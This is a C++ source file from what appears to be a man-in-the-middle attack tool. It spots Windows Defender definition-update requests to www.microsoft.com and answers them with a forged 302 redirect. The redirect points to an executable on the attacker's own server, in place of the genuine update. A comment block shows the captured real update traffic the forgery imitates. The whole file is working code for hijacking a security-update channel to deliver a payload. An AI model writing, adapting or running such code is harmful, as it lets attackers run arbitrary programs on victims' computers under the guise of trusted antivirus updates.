#include "WindowsUpdate.h"
#include <windows.h>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../Public.h"
#include "../attacker.h"
#include "sslPublic.h"

int WindowsUpdate::isWindows(const char * url, const char * host) {
	if (strstr(host, "www.microsoft.com") <= 0) {
		return FALSE;
	}

	if (strstr(url, "/security/encyclopedia/adlpackages.aspx?"))
	{
		return TRUE;
	}

	return FALSE;
}



int WindowsUpdate::replyWindows(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpFormat =
		"HTTP/1.1 302 Moved Temporarily\r\n"
		"Content-Type: text/html; charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		"Location: http://%s/%s\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	char hdrformat[4096];

	char szformat[] =
		"<html>\r\n"
		"<head>\r\n"
		"<title>Object moved</title>\r\n"
		"</head>\r\n"
		"<body>\r\n"
		"<h2>Object moved to <a href=\"http://%s/%s\">here</a>.</h2>\r\n"
		"</body>\r\n"
		"</html>";

	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, strip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME);

	int retlen = sprintf(dstbuf, szHttpFormat, httphdrlen, strip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, hdrformat);

	return retlen;
}


/*
GET /security/encyclopedia/adlpackages.aspx?arch=x64&eng=1.1.16400.2&avdelta=1.303.349.0&asdelta=1.303.349.0&prod=77BDAF73-B396-481F-9042-AD358843EC24&ostype=0&signaturetype=0&beta=0&plat=4.18.1909.6&OsVersion=10.0.17763.379 HTTP/1.1
Connection: Keep-Alive
Accept-Charset: utf-8
User-Agent: MpCommunication
Host: www.microsoft.com

HTTP/1.1 302 Moved Temporarily
Content-Length: 236
Content-Type: text/html; charset=utf-8
Location: https://definitionupdates.microsoft.com/download/DefinitionUpdates/VersionedSignatures/AM/1.303.1497.0/amd64/mpam-d.exe
X-EdgeConnect-Origin-MEX-Latency: 6
Expires: Sat, 12 Oct 2019 02:12:14 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Sat, 12 Oct 2019 02:12:14 GMT
Connection: keep-alive
Set-Cookie: ARRAffinity=18994d9f3fcc33dcf7fd0d7c66179a9820d0e556a4f5069eaac8a33814f698d5;Path=/;HttpOnly;Domain=adl.sr.wd.microsoft.com
R-Tag: SecADL
TLS_version: tls1.2
Strict-Transport-Security: max-age=31536000
X-RTag: RT

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="https://definitionupdates.microsoft.com/download/DefinitionUpdates/VersionedSignatures/AM/1.303.1497.0/amd64/mpam-d.exe">here</a>.</h2>
</body></html>


GET /download/DefinitionUpdates/VersionedSignatures/AM/1.303.1497.0/amd64/mpam-d.exe HTTP/1.1
Connection: Keep-Alive
Accept-Charset: utf-8
User-Agent: MpCommunication
Host: definitionupdates.microsoft.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Server: Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0
x-ms-request-id: 6acfc31e-a01e-00f8-4a90-804aa2000000
x-ms-version: 2009-09-19
x-ms-lease-status: unlocked
x-ms-blob-type: BlockBlob
Last-Modified: Fri, 11 Oct 2019 23:26:23 GMT
ETag: 0x8D74EA26E037A7A
Content-Length: 20081352
Date: Sat, 12 Oct 2019 02:12:15 GMT
Connection: keep-alive

MZ
*/